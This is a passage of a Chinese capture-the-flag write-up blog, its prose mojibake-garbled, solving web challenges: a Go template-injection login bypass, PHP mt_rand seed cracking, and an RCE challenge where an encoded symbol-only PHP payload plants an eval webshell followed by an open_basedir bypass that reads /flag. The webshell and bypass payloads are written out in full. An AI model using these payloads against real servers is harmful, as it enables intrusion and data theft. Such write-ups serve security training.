<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	c.HTML(<span class="number">200</span>, <span class="string">&quot;index.tmpl&quot;</span>, gin.H&#123;</span><br><span class="line">		<span class="string">&quot;title&quot;</span>: <span class="string">&quot;Try Loginme&quot;</span>,</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Login</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	idString, flag := c.GetQuery(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> !flag &#123;</span><br><span class="line">		idString = <span class="string">&quot;1&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	id, err := strconv.Atoi(idString)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		id = <span class="number">1</span></span><br><span class="line">	&#125;</span><br><span class="line">	TargetUser := structs.Admin</span><br><span class="line">	<span class="keyword">for</span> _, user := <span class="keyword">range</span> structs.Users &#123;</span><br><span class="line">		<span class="keyword">if</span> user.Id == id &#123;</span><br><span class="line">			TargetUser = user</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	age := TargetUser.Age</span><br><span class="line">	<span class="keyword">if</span> age == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		age, flag = c.GetQuery(<span class="string">&quot;age&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> !flag &#123;</span><br><span class="line">			age = <span class="string">&quot;forever 18 (Tell me the age)&quot;</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.AbortWithError(<span class="number">500</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	html := fmt.Sprintf(templates.AdminIndexTemplateHtml, age)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.AbortWithError(<span class="number">500</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	tmpl, err := template.New(<span class="string">&quot;admin_index&quot;</span>).Parse(html)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.AbortWithError(<span class="number">500</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	tmpl.Execute(c.Writer, TargetUser)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>structs.go</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> structs</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> UserInfo <span class="keyword">struct</span> &#123;</span><br><span class="line">	Id       <span class="type">int</span></span><br><span class="line">	Username <span class="type">string</span></span><br><span class="line">	Age      <span class="type">string</span></span><br><span class="line">	Password <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Users = []UserInfo&#123;</span><br><span class="line">	&#123;</span><br><span class="line">		Id:       <span class="number">1</span>,</span><br><span class="line">		Username: <span class="string">&quot;Grandpa Lu&quot;</span>,</span><br><span class="line">		Age:      <span class="string">&quot;22&quot;</span>,</span><br><span class="line">		Password: <span class="string">&quot;hack you!&quot;</span>,</span><br><span class="line">	&#125;,</span><br><span class="line">	&#123;</span><br><span class="line">		Id:       <span class="number">2</span>,</span><br><span class="line">		Username: <span class="string">&quot;Longlone&quot;</span>,</span><br><span class="line">		Age:      <span class="string">&quot;??&quot;</span>,</span><br><span class="line">		Password: <span class="string">&quot;i don&#x27;t know&quot;</span>,</span><br><span class="line">	&#125;,</span><br><span class="line">	&#123;</span><br><span class="line">		Id:       <span class="number">3</span>,</span><br><span class="line">		Username: <span class="string">&quot;Teacher Ma&quot;</span>,</span><br><span class="line">		Age:      <span class="string">&quot;20&quot;</span>,</span><br><span class="line">		Password: <span class="string">&quot;guess&quot;</span>,</span><br><span class="line">	&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Admin = UserInfo&#123;</span><br><span class="line">	Id:       <span class="number">0</span>,</span><br><span class="line">	Username: <span class="string">&quot;Admin&quot;</span>,</span><br><span class="line">	Age:      <span class="string">&quot;&quot;</span>,</span><br><span class="line">	Password: <span class="string">&quot;flag&#123;&#125;&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206135001872.png" alt="image-20241206135001872"></p>
<p>æˆ‘ä»¬å‘ç°å½“idä¸º0æ—¶ageä¸ºç©ºï¼Œæ­¤æ—¶ageæ˜¯å¯ä»¥ç”±æˆ‘ä»¬è‡ªå·±ä¼ å‚çš„ï¼Œä¹Ÿå°±æ˜¯å¯æ§çš„ï¼Œåç»­çš„ä»£ç å¯¹ageè¿›è¡Œäº†æ¨¡æ¿æ¸²æŸ“ï¼Œå­˜åœ¨sstiã€‚</p>
<p>è€Œåœ¨goè¯­è¨€ä¸­ä½¿ç”¨çš„æ˜¯<code>&#123;&#123;.name&#125;&#125;</code>ä»£è¡¨è¦åº”ç”¨çš„å¯¹è±¡ï¼Œæ‰€ä»¥å¯ä»¥è®©<code>age=&#123;&#123;.Password&#125;&#125;</code></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/88f0ac4113ccb65120ad8a4bb3409bda.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>æ‹¿ä¸‹äº†</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206135214358.png" alt="image-20241206135214358"></p>
<h2 id="GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–"><a href="#GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–" class="headerlink" title="[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–"></a>[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–</h2><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206162301273.png" alt="image-20241206162301273" style="zoom:67%;" />

<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206162320564.png" alt="image-20241206162320564" style="zoom:67%;" />

<p>ç½‘é¡µæºä»£ç ä¸­å‘ç°jsä»£ç ï¼Œå­˜åœ¨æ ¡éªŒç•Œé¢check.phpï¼Œæ‰“å¼€çœ‹çœ‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]=<span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str_show</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]===<span class="variable">$str</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;check.php&quot;</span>); </span><br></pre></td></tr></table></figure>

<p>å·²çŸ¥æ•°çŒœç§å­ï¼Œh5n5BBh4Rg</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">str1 =<span class="string">&#x27;h5n5BBh4Rg&#x27;</span></span><br><span class="line">str2 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">result =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">length = <span class="built_in">str</span>(<span class="built_in">len</span>(str2)-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str1)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str2)):</span><br><span class="line">        <span class="keyword">if</span> str1[i] ==  str2[j]:</span><br><span class="line">            result += <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> +<span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + length + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Let&#x27;s pretend to know only the first password.  We need to convert it to</span><br><span class="line">inputs to php_mt_seed</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7 7 0 61 31 31 0 61 13 13 0 61 31 31 0 61 37 37 0 61 37 37 0 61 7 7 0 61 30 30 0 61 53 53 0 61 6 6 0 61</span><br></pre></td></tr></table></figure>

<p>ä¼ å…¥php_mt_seedå³å¯ï¼</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206170630174.png" alt="image-20241206170630174"></p>
<p>æ‹¿ä¸‹ç§å­ï¼53788000</p>
<p>æ„é€ ä¸€ä¸‹éšæœºæ•°</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">53788000</span>);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206170818784.png" alt="image-20241206170818784"></p>
<h2 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-hardrce-3"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-hardrce-3" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]hardrce_3"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]hardrce_3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\~&#x27;</span>,<span class="string">&#x27;\|&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å°ä¼™å­åªä¼šå¼‚æˆ–å’Œå–åï¼Ÿä¸å¥½æ„æ€å“¦LTLTè¯´ä¸èƒ½ç”¨ï¼ï¼&quot;</span>);</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z0-9]/is&#x27;</span>,<span class="variable">$wllm</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;sAlGhulè¯´ç”¨å­—æ¯æ•°å­—æ˜¯æ²¡æœ‰çµé­‚çš„ï¼&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NoVic4è¯´ï¼šä¸é”™å“¦å°ä¼™å­ï¼Œå¯ä½ èƒ½æ‹¿åˆ°flagå—ï¼Ÿ&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;è”¡æ€»è¯´ï¼šæ³¨æ„å®¡é¢˜ï¼ï¼ï¼&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æŒºç®€å•çš„ï¼Œè‡ªå¢å°±è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://node7.anna.nssctf.cn:29288/?wllm=%24%5F%3D%5B%5D%3B%24%5F%3D%40%22%24%5F%22%3B%24%5F%3D%24%5F%5B%27%21%27%3D%3D%27%40%27%5D%3B%24%5F%5F%5F%3D%24%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%5F%5F%3D%27%5F%27%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%3D%24%24%5F%5F%5F%5F%3B%24%5F%5F%5F%28%24%5F%5B%5F%5D%29%3B</span><br><span class="line">_=file_put_contents(&quot;1.php&quot;,&quot;&lt;?php eval(\$_POST[&#x27;cmd&#x27;]);?&gt;&quot;);</span><br></pre></td></tr></table></figure>

<p>å¾€1.phpä¸­å†™å…¥ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œå½“æ—¶systemæ‰§è¡Œä¸äº†ï¼Œçœ‹äº†ä¸‹phpinfo()å‘ç°banäº†å¥½å¤šå‡½æ•°ï¼Œfile_get_contentså’Œfile_put_contentsè¿˜åœ¨ï¼Œå…ˆå†™ä¸ªæ–¹ä¾¿ç‚¹çš„åé—¨ç„¶åçœ‹çœ‹ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=file_put_contents(&#x27;2.php&#x27;,&quot;&lt;?php print_r(ini_get(&#x27;open_basedir&#x27;).&#x27;&lt;br&gt;&#x27;);&quot;);</span><br></pre></td></tr></table></figure>

<p>å›æ˜¾å¦‚ä¸‹</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206181457145.png" alt="image-20241206181457145"></p>
<p>è¢«é™åˆ¶åœ¨&#x2F;tmpç›®å½•ä¸‹ï¼Œæ¥ä¸‹æ¥è¿˜æ˜¯è¯•è¯•ç›´æ¥file_get_contentsèƒ½ä¸èƒ½è·å–åˆ°flag</p>
<p>ä¸è¡Œï¼Œå¥½çƒ¦å•Šè¿™ç§disable functionï¼Œç›´æ¥å“¥æ–¯æ‹‰ï¼ï¼ï¼é‡Œé¢ä¼šè‡ªåŠ¨ç»•è¿‡</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206182342197.png" alt="image-20241206182342197"></p>
<p>ç‰›é€¼å“¥æ–¯æ‹‰ï¼</p>
<p>è¿™ç§æ–¹æ³•ä¹Ÿå¯ä»¥ï¼</p>
<p>ç»•è¿‡open_basedirçš„æ–¹æ³•ï¼ï¼ï¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=file_put_contents(&#x27;a.php&#x27;,&quot;&lt;?php print_r(ini_get(&#x27;open_basedir&#x27;).&#x27;&lt;br&gt;&#x27;); mkdir(&#x27;test&#x27;); chdir(&#x27;test&#x27;); ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;); chdir(&#x27;..&#x27;); chdir(&#x27;..&#x27;); chdir(&#x27;..&#x27;); ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;); echo file_get_contents(&#x27;/flag&#x27;); print(1);?&gt; &quot;);</span><br></pre></td></tr></table></figure>

<p>å…³é”®ä»£ç ä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);</span><br></pre></td></tr></table></figure>

<p>å°†é™åˆ¶è®¾ç½®ä¸ºå½“å‰ç›®å½•çš„çˆ¶ç›®å½•</p>
<p>ç»è¿‡ä¸‰æ¬¡chdirï¼Œè‡ªèº«å˜åˆ°äº†&#x2F;varï¼Œä½†æ˜¯æ­¤æ—¶open_basedirä¸ºå…¶çˆ¶ç›®å½•ï¼Œå› æ­¤å°±æ˜¯æ ¹ç›®å½•ï¼Œé‚£ä¹ˆå°±æ‹¿ä¸‹äº†ï¼</p>
<h2 id="å¹¿ä¸œå¼ºç½‘æ¯-2021-å›¢é˜Ÿç»„-love-Pokemon"><a href="#å¹¿ä¸œå¼ºç½‘æ¯-2021-å›¢é˜Ÿç»„-love-Pokemon" class="headerlink" title="[å¹¿ä¸œå¼ºç½‘æ¯ 2021 å›¢é˜Ÿç»„]love_Pokemon"></a>[å¹¿ä¸œå¼ºç½‘æ¯ 2021 å›¢é˜Ÿç»„]love_Pokemon</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 